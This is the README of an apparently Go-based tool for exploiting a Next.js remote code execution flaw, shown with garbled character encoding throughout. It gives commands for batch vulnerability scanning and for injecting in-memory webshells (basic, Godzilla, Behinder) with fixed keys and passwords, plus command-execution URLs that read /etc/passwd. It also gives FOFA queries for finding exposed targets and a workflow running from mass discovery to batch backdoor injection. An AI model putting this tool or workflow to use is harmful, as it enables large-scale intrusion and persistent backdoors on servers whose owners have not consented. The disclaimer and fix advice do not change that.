# Next.js RCE æ¼æ´æ£€æµ‹å·¥å…·

ä¸€ä¸ªç”¨Goè¯­è¨€ç¼–å†™çš„Next.jsæ— æ¡ä»¶è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰æ¼æ´æ£€æµ‹å’Œåˆ©ç”¨å·¥å…·ï¼Œæ”¯æŒå‘½ä»¤è¡Œå’Œå›¾å½¢åŒ–ç•Œé¢ã€‚

## âš ï¸ å…è´£å£°æ˜

**æœ¬å·¥å…·ä»…ä¾›æˆæƒçš„å®‰å…¨æµ‹è¯•ä½¿ç”¨ï¼**

- ä»…ç”¨äºæ£€æµ‹æ‚¨æ‹¥æœ‰æˆ–å·²è·å¾—æ˜ç¡®æˆæƒçš„ç³»ç»Ÿ
- æœªç»æˆæƒçš„æ”»å‡»è¡Œä¸ºæ˜¯è¿æ³•çš„
- ä½¿ç”¨æœ¬å·¥å…·é€ æˆçš„ä»»ä½•åæœç”±ä½¿ç”¨è€…è‡ªè¡Œæ‰¿æ‹…

## åŠŸèƒ½ç‰¹æ€§

- âœ… **å¤šPOCæ£€æµ‹**: ä½¿ç”¨8ç§ä¸åŒçš„POCè‡ªåŠ¨æ£€æµ‹æ¼æ´
- ğŸ’‰ **å¤šç±»å‹å†…å­˜é©¬**: æ”¯æŒåŸºç¡€ã€Godzillaã€å†°èä¸‰ç§å†…å­˜é©¬
- ğŸ“ **æ‰¹é‡æ‰«æ**: æ”¯æŒä»æ–‡ä»¶è¯»å–å¤šä¸ªç›®æ ‡URL
- ğŸ¯ **ç²¾ç¡®æ£€æµ‹**: åŸºäºå¤šç§çœŸå®POCéªŒè¯æ¼æ´å­˜åœ¨æ€§
- ğŸ” **æ™ºèƒ½è¯†åˆ«**: è‡ªåŠ¨å°è¯•å¤šç§æ£€æµ‹æ–¹å¼ç›´åˆ°å‘ç°æ¼æ´
- ğŸ” **åŠ å¯†é€šä¿¡**: Godzillaå’Œå†°èå†…å­˜é©¬æ”¯æŒAESåŠ å¯†
- ğŸ” **FOFAæœç´¢**: æä¾›30+æœç´¢è¯­å¥å¿«é€Ÿå‘ç°ç›®æ ‡

## å®‰è£…

### å‰ç½®è¦æ±‚

- Go 1.16 æˆ–æ›´é«˜ç‰ˆæœ¬

### ç¼–è¯‘

```bash
# å…‹éš†æˆ–ä¸‹è½½æºç åˆ°æœ¬åœ°
cd next

# ç¼–è¯‘
go build -o nextjs-rce-tool

# æˆ–è€…ç›´æ¥è¿è¡Œ
go run .
```

## ä½¿ç”¨æ–¹æ³•

### 1. å‘½ä»¤è¡Œæ¨¡å¼

#### æ£€æµ‹å•ä¸ªç›®æ ‡

```bash
./nextjs-rce-tool --check --target http://example.com
```

#### æ£€æµ‹å¤šä¸ªç›®æ ‡ï¼ˆä»æ–‡ä»¶è¯»å–ï¼‰

```bash
# åˆ›å»ºç›®æ ‡æ–‡ä»¶ targets.txt
echo "http://target1.com" > targets.txt
echo "http://target2.com" >> targets.txt

# æ‰§è¡Œæ‰¹é‡æ£€æµ‹ï¼ˆè‡ªåŠ¨ä¿å­˜æˆåŠŸç»“æœï¼‰
./nextjs-rce-tool --check --file targets.txt

# è‡ªå®šä¹‰è¾“å‡ºæ–‡ä»¶å
./nextjs-rce-tool --check --file targets.txt --output my_results.txt
```

**æ‰¹é‡æ£€æµ‹è¾“å‡ºç¤ºä¾‹**ï¼š
```
2025/12/10 18:30:00 å¼€å§‹æ¼æ´æ£€æµ‹...
2025/12/10 18:30:00 æ‰¹é‡æ£€æµ‹æ¨¡å¼ï¼ŒæˆåŠŸç»“æœå°†ä¿å­˜åˆ°: vulnerable_20251210_183000.txt

[*] æ£€æµ‹ç›®æ ‡: http://target1.com
[*] ä½¿ç”¨ 8 ä¸ªPOCè¿›è¡Œæ£€æµ‹...
[+] æ¼æ´å­˜åœ¨! (POC 2 æ£€æµ‹æˆåŠŸ)

[*] æ£€æµ‹ç›®æ ‡: http://target2.com
[-] æœªæ£€æµ‹åˆ°æ¼æ´ (å·²å°è¯•æ‰€æœ‰POC)

[+] æ£€æµ‹å®Œæˆï¼å‘ç° 1 ä¸ªå­˜åœ¨æ¼æ´çš„ç›®æ ‡
[+] ç»“æœå·²ä¿å­˜åˆ°: vulnerable_20251210_183000.txt
```

**ç»“æœæ–‡ä»¶æ ¼å¼**ï¼š
```
# Next.js RCE æ¼æ´æ£€æµ‹ç»“æœ
# æ£€æµ‹æ—¶é—´: 2025-12-10 18:30:00
# å‘ç°æ¼æ´æ•°é‡: 1
# ========================================

[1] http://target1.com
    çŠ¶æ€: å­˜åœ¨æ¼æ´
    æ£€æµ‹POC: POC 2
    è¯¦ç»†ä¿¡æ¯: é‡å®šå‘æ£€æµ‹æˆåŠŸ - /login?a=uid=0(root)
    æ£€æµ‹æ—¶é—´: 2025-12-10 18:30:15

# ========================================
# çº¯URLåˆ—è¡¨ï¼ˆå¯ç›´æ¥ç”¨äºæ‰¹é‡æ³¨å…¥ï¼‰
# ========================================

http://target1.com
```

#### æ³¨å…¥å†…å­˜é©¬

```bash
# æ³¨å…¥åŸºç¡€å†…å­˜é©¬ï¼ˆç®€å•å‘½ä»¤æ‰§è¡Œï¼‰
./nextjs-rce-tool --shell --type basic --target http://example.com

# æ³¨å…¥Godzillaå“¥æ–¯æ‹‰å†…å­˜é©¬
./nextjs-rce-tool --shell --type godzilla --target http://example.com

# æ³¨å…¥Behinderå†°èå†…å­˜é©¬
./nextjs-rce-tool --shell --type behinder --target http://example.com
```

**åŸºç¡€å†…å­˜é©¬ä½¿ç”¨**ï¼š
```bash
# è®¿é—®ä»¥ä¸‹URLæ‰§è¡Œå‘½ä»¤
http://example.com/exec?cmd=whoami
http://example.com/exec?cmd=ls -la
http://example.com/exec?cmd=cat /etc/passwd
```

**Godzillaå†…å­˜é©¬ä½¿ç”¨**ï¼š
- ä½¿ç”¨Godzillaå®¢æˆ·ç«¯è¿æ¥
- Shellåœ°å€: `http://example.com/`
- å¯†ç å‚æ•°: `pass`
- å¯†é’¥: `3c6e0b8a9c15224a`
- åŠ å¯†: AES-128-ECB

**Behinderå†°èå†…å­˜é©¬ä½¿ç”¨**ï¼š
- ä½¿ç”¨å†°èå®¢æˆ·ç«¯è¿æ¥
- Shellåœ°å€: `http://example.com/`
- è¿æ¥å¯†ç : `rebeyond`
- åŠ å¯†: AES-128-CBC

è¯¦ç»†ä½¿ç”¨è¯´æ˜è¯·æŸ¥çœ‹ [å†…å­˜é©¬ä½¿ç”¨æ–‡æ¡£.md](å†…å­˜é©¬ä½¿ç”¨æ–‡æ¡£.md)

### 2. ä½¿ç”¨FOFAæœç´¢ç›®æ ‡

**å¿«é€Ÿå‘ç°å­˜åœ¨æ¼æ´çš„Next.jsåº”ç”¨**ï¼š

```bash
# æ¨èæœç´¢è¯­å¥ï¼ˆå¤åˆ¶åˆ°FOFAæœç´¢æ¡†ï¼‰
(body="_next/static" || body="__NEXT_DATA__") && status_code="200" && country="CN"

# ç²¾å‡†å®šä½Server Actionsåº”ç”¨
body="__NEXT_DATA__" && body="<form" && status_code="200" && protocol="https"

# æœç´¢å¼€å‘ç¯å¢ƒï¼ˆæ›´å®¹æ˜“å­˜åœ¨æ¼æ´ï¼‰
body="_next/static" && (domain="dev" || domain="test" || port="3000")
```

**ä½¿ç”¨æµç¨‹**ï¼š
1. åœ¨FOFAç½‘ç«™ä½¿ç”¨ä¸Šè¿°è¯­å¥æœç´¢
2. å¯¼å‡ºæœç´¢ç»“æœä¸ºTXTæˆ–CSV
3. æå–URLåˆ—è¡¨ä¿å­˜åˆ°æ–‡ä»¶
4. ä½¿ç”¨å·¥å…·æ‰¹é‡æ£€æµ‹ï¼ˆè‡ªåŠ¨ä¿å­˜ç»“æœï¼‰ï¼š
   ```bash
   ./nextjs-rce-tool --check --file fofa_results.txt
   # ç»“æœè‡ªåŠ¨ä¿å­˜åˆ° vulnerable_æ—¶é—´æˆ³.txt
   ```
5. ä½¿ç”¨ä¿å­˜çš„URLåˆ—è¡¨è¿›è¡Œæ‰¹é‡æ³¨å…¥ï¼š
   ```bash
   # ç»“æœæ–‡ä»¶åŒ…å«çº¯URLåˆ—è¡¨ï¼Œå¯ç›´æ¥ä½¿ç”¨
   ./nextjs-rce-tool --shell --type godzilla --file vulnerable_20251210_183000.txt
   ```

**æ›´å¤šæœç´¢è¯­å¥**ï¼šæŸ¥çœ‹ [FOFAæœç´¢è¯­å¥.md](FOFAæœç´¢è¯­å¥.md) è·å–30+ä¸“ä¸šæœç´¢è¯­å¥

### 3. å›¾å½¢åŒ–ç•Œé¢æ¨¡å¼

å·²ç§»é™¤å›¾å½¢åŒ–ç•Œé¢ï¼Œä»…ä¿ç•™å‘½ä»¤è¡Œæ¨¡å¼ã€‚

## å‘½ä»¤è¡Œå‚æ•°

| å‚æ•° | è¯´æ˜ | ç¤ºä¾‹ |
|------|------|------|
| `--check` | æ£€æµ‹æ¨¡å¼ï¼ŒéªŒè¯ç›®æ ‡æ˜¯å¦å­˜åœ¨æ¼æ´ | `--check` |
| `--shell` | å†…å­˜é©¬æ¨¡å¼ï¼Œæ³¨å…¥å†…å­˜é©¬åé—¨ | `--shell` |
| `--target` | æŒ‡å®šå•ä¸ªç›®æ ‡URL | `--target http://example.com` |
| `--file` | ä»æ–‡ä»¶è¯»å–å¤šä¸ªç›®æ ‡URL | `--file targets.txt` |
| `--output` | æ‰¹é‡æ£€æµ‹æ—¶æŒ‡å®šç»“æœè¾“å‡ºæ–‡ä»¶ | `--output result.txt` |

**æ‰¹é‡æ£€æµ‹ç»“æœè¾“å‡º**ï¼š
- ä½¿ç”¨ `--file` æ‰¹é‡æ£€æµ‹æ—¶ï¼Œä¼šè‡ªåŠ¨ä¿å­˜æ¼æ´ç»“æœåˆ°æ–‡ä»¶
- é»˜è®¤æ–‡ä»¶åï¼š`vulnerable_æ—¶é—´æˆ³.txt` (ä¾‹å¦‚ï¼š`vulnerable_20240115_143022.txt`)
- ä½¿ç”¨ `--output` å¯è‡ªå®šä¹‰è¾“å‡ºæ–‡ä»¶å
- ç»“æœåŒ…å«ï¼šæ¼æ´è¯¦æƒ…ã€POCç´¢å¼•ã€æ£€æµ‹æ—¶é—´ã€çº¯URLåˆ—è¡¨ï¼ˆç”¨äºæ‰¹é‡æ³¨å…¥å†…å­˜é©¬ï¼‰

## æ£€æµ‹åŸç†

æœ¬å·¥å…·ä½¿ç”¨ä»¥ä¸‹å¤šç§POCè¿›è¡Œæ£€æµ‹ï¼š

1. **å‘½ä»¤å›æ˜¾æ£€æµ‹**ï¼šé€šè¿‡æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å¹¶åœ¨é‡å®šå‘Locationå¤´ä¸­å›æ˜¾ç»“æœ
2. **ç¯å¢ƒå˜é‡æ£€æµ‹**ï¼šé€šè¿‡è¯»å–Node.jsè¿›ç¨‹ä¿¡æ¯éªŒè¯ä»£ç æ‰§è¡Œ
3. **ç³»ç»Ÿä¿¡æ¯æ£€æµ‹**ï¼šé€šè¿‡è·å–æ“ä½œç³»ç»Ÿä¿¡æ¯ç¡®è®¤æ¼æ´
4. **ç®€åŒ–æ£€æµ‹**ï¼šä½¿ç”¨æœ€å°åŒ–payloadå¿«é€ŸéªŒè¯æ¼æ´å­˜åœ¨

æ¯ç§POCéƒ½ä¼šå°è¯•ä¸åŒçš„æ£€æµ‹æ–¹å¼ï¼Œæé«˜æ£€æµ‹æˆåŠŸç‡ã€‚

å·¥å…·é€šè¿‡ä»¥ä¸‹æ–¹å¼æ£€æµ‹å’Œåˆ©ç”¨æ¼æ´ï¼š

1. æ„å»ºç‰¹åˆ¶çš„multipart/form-dataè¯·æ±‚
2. åˆ©ç”¨åŸå‹é“¾æ±¡æŸ“è§¦å‘ä»£ç æ‰§è¡Œ
3. é€šè¿‡Next.jsçš„Server Actionsæœºåˆ¶æ‰§è¡Œä»»æ„Node.jsä»£ç 
4. å†…å­˜é©¬é€šè¿‡åŠ«æŒ`http.Server.prototype.emit`å®ç°æŒä¹…åŒ–

### æ£€æµ‹æ¨¡å¼

```
[*] æ£€æµ‹ç›®æ ‡: http://example.com
[*] ä½¿ç”¨ 8 ä¸ªPOCè¿›è¡Œæ£€æµ‹...
[*] å°è¯• POC 1/8...
[*] å°è¯• POC 2/8...
[+] æ¼æ´å­˜åœ¨! (POC 2 æ£€æµ‹æˆåŠŸ)
[+] é‡å®šå‘åˆ°: /login?a=uid=0(root) gid=0(root) groups=0(root)
```

### æ³¨å…¥æ¨¡å¼

```
[*] æ³¨å…¥å†…å­˜é©¬åˆ°: http://example.com
[*] å†…å­˜é©¬ç±»å‹: Godzilla å“¥æ–¯æ‹‰
[*] å¯†ç : pass (å‚æ•°å)
[*] å¯†é’¥: 3c6e0b8a9c15224a
[*] åŠ å¯†: AES-128-ECB
[+] å†…å­˜é©¬æ³¨å…¥å®Œæˆ
[*] å“åº”çŠ¶æ€ç : 200
[+] Webshellåœ°å€: http://example.com/ (ä»»æ„è·¯å¾„)

[+] ä½¿ç”¨è¯´æ˜:
  1. ä½¿ç”¨Godzillaå·¥å…·è¿æ¥
  2. é€‰æ‹©ç›®æ ‡ç±»å‹: NODEJS
  3. å¯†ç å‚æ•°: pass
  4. å¯†é’¥: 3c6e0b8a9c15224a

[!] æç¤º: å†…å­˜é©¬å·²æ³¨å…¥ï¼Œä½¿ç”¨å¯¹åº”å·¥å…·è¿æ¥å³å¯
```
## ç›®å½•ç»“æ„

```
.
â”œâ”€â”€ main.go                # ä¸»ç¨‹åºå…¥å£å’Œå‚æ•°è§£æ
â”œâ”€â”€ exploit.go             # POCæ„å»ºå’Œæ¼æ´åˆ©ç”¨(8ç§æ£€æµ‹POC + 3ç§å†…å­˜é©¬)
â”œâ”€â”€ utils.go               # å·¥å…·å‡½æ•°
â”œâ”€â”€ README.md              # è¯´æ˜æ–‡æ¡£
â”œâ”€â”€ å†…å­˜é©¬ä½¿ç”¨æ–‡æ¡£.md      # å†…å­˜é©¬è¯¦ç»†ä½¿ç”¨è¯´æ˜
â”œâ”€â”€ POCè¯´æ˜.md             # POCæŠ€æœ¯ç»†èŠ‚
â”œâ”€â”€ FOFAæœç´¢è¯­å¥.md        # 30+ FOFAæœç´¢è¯­å¥é›†åˆ
â””â”€â”€ targets.txt.example    # ç›®æ ‡åˆ—è¡¨ç¤ºä¾‹
```

## FOFAèµ„äº§æœç´¢

æœ¬å·¥å…·æä¾›äº†ä¸°å¯Œçš„FOFAæœç´¢è¯­å¥ï¼Œå¸®åŠ©å¿«é€Ÿå‘ç°å­˜åœ¨æ¼æ´çš„Next.jsåº”ç”¨ã€‚

**å¸¸ç”¨æœç´¢è¯­å¥**ï¼š
```
# åŸºç¡€æœç´¢
body="_next/static" && status_code="200" && country="CN"

# é«˜ä»·å€¼ç›®æ ‡
body="__NEXT_DATA__" && cert.is_valid="true" && protocol="https"

# å¼€å‘ç¯å¢ƒ
body="_next/static" && (domain="dev" || port="3000")
```

è¯¦ç»†æœç´¢ç­–ç•¥è¯·æŸ¥çœ‹ï¼š[FOFAæœç´¢è¯­å¥.md](FOFAæœç´¢è¯­å¥.md)

å†…å®¹åŒ…æ‹¬ï¼š
- 30+ ä¸“ä¸šæœç´¢è¯­å¥
- æŒ‰è¡Œä¸š/ç±»å‹åˆ†ç±»
- ç»„åˆæœç´¢ç­–ç•¥
- ç»“æœå¤„ç†è„šæœ¬
- æ‰¹é‡æ£€æµ‹æµç¨‹

## æŠ€æœ¯æ ˆ

- **Go 1.16+**: ä¸»è¦å¼€å‘è¯­è¨€
- **net/http**: HTTPå®¢æˆ·ç«¯
- **mime/multipart**: æ„å»ºmultipartè¡¨å•æ•°æ®
- **å¤šPOCç­–ç•¥**: æé«˜æ£€æµ‹å‡†ç¡®ç‡

## å®‰å…¨å»ºè®®

1. **ä»…åœ¨æˆæƒç¯å¢ƒä¸­ä½¿ç”¨**
2. **ä¸è¦åœ¨ç”Ÿäº§ç¯å¢ƒä¸­è¿è¡Œ**
3. **ä½¿ç”¨å®Œæ¯•ååŠæ—¶æ¸…ç†å†…å­˜é©¬**
4. **ä¿å­˜å¥½æ£€æµ‹æ—¥å¿—ç”¨äºå®¡è®¡**

## æ¼æ´å½±å“ç‰ˆæœ¬

å—å½±å“çš„Next.jsç‰ˆæœ¬ï¼š
- è¯¦è§å®˜æ–¹å®‰å…¨å…¬å‘Š

## ä¿®å¤å»ºè®®

1. å‡çº§Next.jsåˆ°æœ€æ–°ç‰ˆæœ¬
2. ç¦ç”¨ä¸å¿…è¦çš„Server ActionsåŠŸèƒ½
3. å®æ–½è¾“å…¥éªŒè¯å’Œè¿‡æ»¤
4. ä½¿ç”¨WAFè§„åˆ™æ‹¦æˆªå¯ç–‘è¯·æ±‚

## å¼€å‘è€…

æœ¬å·¥å…·åŸºäºå…¬å¼€çš„Next.js RCEæ¼æ´POCå¼€å‘ï¼Œç”¨äºå®‰å…¨æµ‹è¯•å’Œæ¼æ´éªŒè¯ã€‚

## è®¸å¯è¯

æœ¬é¡¹ç›®ä»…ä¾›å­¦ä¹ å’Œæˆæƒæµ‹è¯•ä½¿ç”¨ã€‚

## æ›´æ–°æ—¥å¿—

### v1.0.0 (2025-12-10)
- âœ¨ åˆå§‹ç‰ˆæœ¬å‘å¸ƒ
- âœ… æ”¯æŒå‘½ä»¤è¡Œæ£€æµ‹å’Œæ³¨å…¥
- ğŸ“ æ‰¹é‡ç›®æ ‡æ‰«æ
- ğŸ’‰ å†…å­˜é©¬æ³¨å…¥åŠŸèƒ½
- ğŸ” 8ç§POCå¤šé‡æ£€æµ‹

## å¸¸è§é—®é¢˜

**Q: ä¸ºä»€ä¹ˆä½¿ç”¨å¤šä¸ªPOCï¼Ÿ**
A: ä¸åŒçš„ç›®æ ‡ç¯å¢ƒå¯èƒ½å¯¹æŸäº›POCæœ‰ä¸åŒçš„å“åº”ï¼Œä½¿ç”¨å¤šä¸ªPOCå¯ä»¥æé«˜æ£€æµ‹æˆåŠŸç‡ã€‚

**Q: å¦‚ä½•æ¸…ç†å†…å­˜é©¬ï¼Ÿ**
A: é‡å¯Node.jsè¿›ç¨‹å³å¯æ¸…é™¤å†…å­˜é©¬ã€‚

**Q: Godzillaå’Œå†°èå†…å­˜é©¬æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ**
A: 
- Godzilla: ä½¿ç”¨å›ºå®šå¯†é’¥ï¼ŒAES-ECBåŠ å¯†ï¼Œç•Œé¢å‹å¥½
- å†°è: ä½¿ç”¨MD5åŠ¨æ€å¯†é’¥ï¼ŒAES-CBCåŠ å¯†ï¼Œæ›´éšè”½

**Q: ä¸ºä»€ä¹ˆé€‰æ‹©è¿™äº›å¯†é’¥ï¼Ÿ**
A: è¯·ç¡®ä¿ç›®æ ‡ä½¿ç”¨äº†å—å½±å“çš„Next.jsç‰ˆæœ¬ï¼Œä¸”Server ActionsåŠŸèƒ½å·²å¯ç”¨ã€‚

**Q: å†…å­˜é©¬æ³¨å…¥åå¦‚ä½•è®¿é—®ï¼Ÿ**
A: è®¿é—® `http://ç›®æ ‡åœ°å€/exec?cmd=å‘½ä»¤` å³å¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚

**Q: æ£€æµ‹ä¼šè¢«WAFæ‹¦æˆªå—ï¼Ÿ**
A: å¯èƒ½ä¼šï¼Œå»ºè®®åœ¨å†…ç½‘ç¯å¢ƒæˆ–å·²æˆæƒçš„æµ‹è¯•ç¯å¢ƒä¸­ä½¿ç”¨ã€‚

**Q: å¦‚ä½•æ¸…ç†å†…å­˜é©¬ï¼Ÿ**
A: é‡å¯Node.jsè¿›ç¨‹å³å¯æ¸…é™¤å†…å­˜é©¬ã€‚

## è”ç³»æ–¹å¼

å¦‚æœ‰é—®é¢˜æˆ–å»ºè®®ï¼Œè¯·æäº¤Issueã€‚
